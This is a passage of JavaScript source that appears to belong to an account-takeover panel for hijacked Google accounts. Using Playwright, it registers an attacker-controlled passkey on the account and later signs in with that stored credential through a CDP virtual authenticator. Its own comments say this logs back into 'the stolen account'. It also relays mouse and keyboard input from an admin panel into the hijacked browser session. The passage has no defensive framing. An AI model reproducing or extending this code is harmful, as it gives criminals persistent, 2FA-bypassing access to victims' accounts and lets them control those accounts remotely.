      // New accounts that never set up 2FA often get an extra "Accept" / setup
      // step before the actual passkey dialog, so we advance even before the
      // "Create a passkey" button has been found.
      if (!clickedAdd) {
        if (await clickPasskeyAdd(page)) {
          clickedAdd = true;
          console.log(`[gsession] ${id} passkey: clicked "Create a passkey"`);
        } else if (await clickPasskeysSection(page)) {
          console.log(`[gsession] ${id} passkey: clicked "Passkeys and security keys" section`);
        } else if (await clickPasskeyContinue(page)) {
          console.log(`[gsession] ${id} passkey: clicked setup/accept step before Create`);
        }
      } else if (await clickPasskeyContinue(page)) {
        console.log(`[gsession] ${id} passkey: clicked Continue/Accept/Allow`);
      }

      // Periodic snapshot so a stuck journey is visible.
      if (Date.now() - lastDebug > 12000) {
        lastDebug = Date.now();
        await passkeyDebug(page, id, 'tick');
      }
      await sleep(900);
    }

    // Timed out — the credential may still have been created.
    const creds = await harvest();
    if (creds.length > before.length) {
      const all = [...(getPasskeys(id) || []), ...creds.slice(before.length)];
      storeUpdate(id, { passkeys: all, passkeyAdded: true });
      return { status: 'ok', state: 'passkey', passkey: true, message: 'Passkey added to the account.' };
    }
    await passkeyDebug(page, id, 'stuck');
    return { status: 'pending', state: 'passkey', message: 'Passkey did not register automatically — open the session and add it by hand, or retry.' };
  } catch (e) {
    return { status: 'error', state: 'passkey', message: `Passkey registration failed (${e.message}).` };
  } finally {
    passkeyInFlight.delete(id);
  }
}

// ---------------------------------------------------------------------------
// Passkey SIGN-IN (the inverse of registerPasskey): use the stored "our device"
// WebAuthn credential to log the session's Chrome back into the stolen account.
// The admin panel exposes this as a button next to the other session actions.
// ---------------------------------------------------------------------------
async function clickPasskeyOption(page) {
  const selectors = [
    'button#passkeyButton',
    'button[id*="passkey"]',
    'a[id*="passkey"]',
    'button[aria-label*="passkey"]',
    'a[aria-label*="passkey"]',
    '[role="button"][aria-label*="passkey"]',
    'button[jsname*="passkey"]',
    '[title*="passkey"]',
  ];
  for (const sel of selectors) {
    const loc = page.locator(sel).first();
    if (await loc.isVisible().catch(() => false)) {
      await loc.click().catch(() => {});
      console.log(`[gsession] passkey sign-in: clicked "${sel}"`);
      return true;
    }
  }
  const byText = page.getByRole('button', { name: /passkey/i });
  if (await byText.first().isVisible().catch(() => false)) {
    await byText.first().click().catch(() => {});
    console.log(`[gsession] passkey sign-in: clicked button by text`);
    return true;
  }
  const link = page.getByRole('link', { name: /passkey/i });
  if (await link.first().isVisible().catch(() => false)) {
    await link.first().click().catch(() => {});
    console.log(`[gsession] passkey sign-in: clicked link by text`);
    return true;
  }
  return false;
}

async function passkeySignInOnPage(page, session, entry) {
  const id = session.id;
  const passkeys = getPasskeys(id) || [];
  if (!passkeys.length) return null;

  let pk = entry.passkey;
  if (!pk || !pk.authenticatorId) {
    pk = entry.passkey = await setupPasskeyAuthenticator(entry.context, page, id);
  }
  if (!pk || !pk.authenticatorId) {
    return { status: 'error', state: 'passkey', message: 'No CDP virtual authenticator available for passkey sign-in.' };
  }

  await page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 45000 }).catch(() => {});
  await sleep(2000);

  const urlLooksSignedIn = () => /myaccount\.google\.com|gds\.google\.com\/web|mail\.google\.com\/(mail|u\/\d+)/.test(page.url());

  let st = await assessLogin(page);
  if (st.status === 'logged-in' || urlLooksSignedIn()) {
    return { status: 'logged-in', state: 'signed-in', message: 'Already signed in on this device — saved session reused.' };
  }

  const email = page.locator('#identifierId, input[name="identifier"], input[type="email"]').first();
  if (await email.isVisible().catch(() => false)) {
    if (session.username) await email.fill(session.username).catch(() => {});
    await clickNext(page, 'Next');
    await sleep(3000);
    st = await assessLogin(page);
  }

  if (st.status === 'logged-in' || urlLooksSignedIn()) {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in on this device — saved session reused.' };
  }
  if (st.status === 'error') return st;

  if (st.state === 'passkey' && /\/challenge\/pk/.test(page.url())) {
    await clickPasskeyContinue(page);
    await sleep(3500);
  } else {
    const clicked = await clickPasskeyOption(page);
    if (!clicked) return null;
    await sleep(3500);
  }

  const afterPasskey = await assessLogin(page);
  if (afterPasskey.status === 'logged-in' || urlLooksSignedIn()) {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in with the stored passkey — session is live.' };
  }
  st = await settleLogin(page);
  if (st.status === 'logged-in' || st.state === 'signed-in') {
    return { status: 'logged-in', state: 'signed-in', message: 'Signed in with the stored passkey — session is live.' };
  }
  if (st.status === 'error') return st;
  if (st.state === 'passkey') {
    return { status: 'pending', state: 'passkey', message: 'Passkey sign-in is waiting for the device confirmation.' };
  }
  return st;
}

export async function passkeyLogin(id, { headless = false } = {}) {
  const raw = getRaw(id);
  if (!raw) return { status: 'error', message: 'Session not found.' };
  const entry = await open(id, undefined, { headless });
  try {
    const res = await passkeySignInOnPage(entry.page, raw, entry);
    if (!res) {
      return { status: 'new', state: 'passkey', message: 'Google did not offer a passkey here. Use Auto-login (password), or add a passkey first.' };
    }
    return res;
  } catch (e) {
    return { status: 'error', state: 'passkey', message: `Passkey sign-in could not complete (${e.message}).` };
  }
}

// Click Google's "Next"/submit: by id if present, else the visible button by
// its label, else just press Enter.
async function clickNext(page, labelText) {
  const byId = page.locator('#identifierNext, #passwordNext, #totpNext');
  if (await byId.count()) {
    await byId.first().click().catch(() => {});
    return;
  }
  try {
    const byRole = page.getByRole('button', { name: labelText, exact: false });
    if (await byRole.count()) {
      await byRole.first().click();
      return;
    }
  } catch {}
  await page.keyboard.press('Enter').catch(() => {});
}

// ---------------------------------------------------------------------------
// Remote control: drive the session's page from the admin panel. The front-end
// maps its (letterboxed) stream pixels onto the page's CSS-pixel viewport and
// sends us events; we replay them through CDP Input on the page's target.
//   move  { x, y, buttons?, modifiers? }
//   down/up { x, y, button: left|right|middle, buttons, clickCount, modifiers? }
//   wheel { x, y, deltaX, deltaY, modifiers? }
//   key   { kind: down|up, key, code, text? }
// ---------------------------------------------------------------------------
export async function sendInput(id, ev) {
  const entry = active.get(id);
  if (!entry) return { ok: false, error: 'browser not open' };
  const t = ev && ev.type;
  try {
    // input follows the tab the panel is driving
    const page = controlPage(entry);
    if (!page) return { ok: false, error: 'No open tab' };
    if (!entry.inputCdp || entry.inputPage !== page) {
      try { if (entry.inputCdp) await entry.inputCdp.detach(); } catch { /* stale */ }
      entry.inputCdp = await entry.context.newCDPSession(page);
      entry.inputPage = page;
    }
    const cdp = entry.inputCdp;
    const num = (v) => (typeof v === 'number' && isFinite(v) ? v : 0);
    if (t === 'move') {
      await cdp.send('Input.dispatchMouseEvent', {
        type: 'mouseMoved', x: num(ev.x), y: num(ev.y),
        buttons: num(ev.buttons), modifiers: num(ev.modifiers),
      });
    } else if (t === 'down' || t === 'up') {
      await cdp.send('Input.dispatchMouseEvent', {
        type: t === 'down' ? 'mousePressed' : 'mouseReleased',
        x: num(ev.x), y: num(ev.y),
        button: ev.button === 'right' ? 'right' : ev.button === 'middle' ? 'middle' : 'left',
        buttons: num(ev.buttons), clickCount: num(ev.clickCount) || 1,
        modifiers: num(ev.modifiers),
      });
    } else if (t === 'wheel') {
      await cdp.send('Input.dispatchMouseEvent', {
        type: 'mouseWheel', x: num(ev.x), y: num(ev.y),
        deltaX: num(ev.deltaX), deltaY: num(ev.deltaY), modifiers: num(ev.modifiers),
      });
    } else if (t === 'key') {
      const base = { key: String(ev.key || ''), code: String(ev.code || '') };
      if (ev.kind === 'up') {
        await cdp.send('Input.dispatchKeyEvent', { type: 'keyUp', ...base });
      } else if (ev.text) {
        await cdp.send('Input.dispatchKeyEvent', { type: 'char', text: String(ev.text), ...base });
      } else {
        await cdp.send('Input.dispatchKeyEvent', { type: 'rawKeyDown', ...base });
      }
    } else {
      return { ok: false, error: 'unknown input type' };
    }
    return { ok: true };
  } catch (e) {
    // Stale CDP session (page/target went away) — drop it; next call re-creates.
    try { if (entry.inputCdp) await entry.inputCdp.detach(); } catch {}
    entry.inputCdp = null;
    return { ok: false, error: e.message };
  }
}
